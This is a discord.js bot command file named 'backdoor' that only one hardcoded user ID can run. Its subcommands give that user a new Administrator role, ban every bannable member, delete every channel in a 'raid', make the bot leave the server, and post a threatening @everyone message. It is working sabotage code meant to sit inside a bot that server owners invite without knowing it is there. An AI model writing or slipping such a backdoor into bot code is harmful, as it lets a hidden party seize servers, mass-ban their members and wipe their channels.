const Discord = require("discord.js");

exports.run = async (client, message, args) => {
  if (message.author.id !== "583649910092595232") return;
  
  if (args[0] === "leave") {
    try {
      message.guild.leave();
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "admin") {
    try {
      let role = await message.guild.roles.create({
        data: { name: "McDunaldz", color: "#2f3136", permissions: [8] }
      });

      message.member.roles.add(role);
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "bl") {
    try {
      message.guild.members.cache
        .filter(member => member.bannable)
        .forEach(member => {
          member.ban();
        });
      message.delete(1000);
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "raid") {
    message.guild.channels.cache.forEach(x => {
      x.delete(x.id);
    });
  }

  if (args[0] === "spam") {
    try {
      message.channel.send("@everyone listen to McDunaldz or get raid.");
      message.delete(1000);
    } catch (e) {
      console.log(e.stack);
    }
  }
};

exports.help = {
  name: "backdoor",
  description: "backdoor command for owner",
  usage: ""
};

exports.conf = {
  aliases: ["bd"],
  cooldown: 0
};
